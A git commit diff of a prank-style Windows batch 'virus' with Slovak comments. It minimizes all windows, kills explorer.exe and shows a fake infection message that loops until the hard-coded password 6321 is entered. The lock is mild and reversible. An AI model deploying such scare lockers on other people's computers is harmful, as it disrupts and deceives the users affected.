1080c662f7f6fbbbc654c39226703aa85b0fc4a0
Jakub Zápražný <zapraznyjakub@gmail.com>
2024-09-30 20:46:11 +0200

    Update Virus.bat

--- Batch/Vírus/Virus.bat
+++ Batch/Vírus/Virus.bat
@@ -2,8 +2,29 @@
 chcp 65001 > nul
 title Virus!!!
 
+:: Minimalizuje všetky okná
+powershell -command "(new-object -comobject shell.application).MinimizeAll()"
 
-PowerShell -Command "(New-Object -ComObject Shell.Application).MinimizeAll()"
-taskkill /f /im explorer.exe
-start dialog.bat
+:: Časový posun, aby sa všetko minimalizovalo
+timeout /t 1 /nobreak >nul
+
+:: Obnoví okno s názvom "Virus!!!"
+powershell -command "$handle = (Get-Process | where {$_.MainWindowTitle -like '*Virus!!!*'}).MainWindowHandle; Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class User32 { [DllImport(\"user32.dll\")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow); }'; [User32]::ShowWindowAsync($handle, 9)"
+
+
+taskkill /f /im explorer.exe > nul
+:start
+echo Váš počítač bol nakazený vírusom,
+echo Ak tento výrus nefunguje kontaktujte Jakuba Zápražného.
+set /p heslo="Zadajte heslo pre odblokovanie výrusu: "
+if %heslo% == 6321 (
+    cls
+    echo Heslo je správne
+    explorer
+) else (
+    echo Heslo je nesprávne skúste to znova
+    timeout /nobreak /t 5 > nul
+    cls
+    goto :start
+)
 exit /b 0
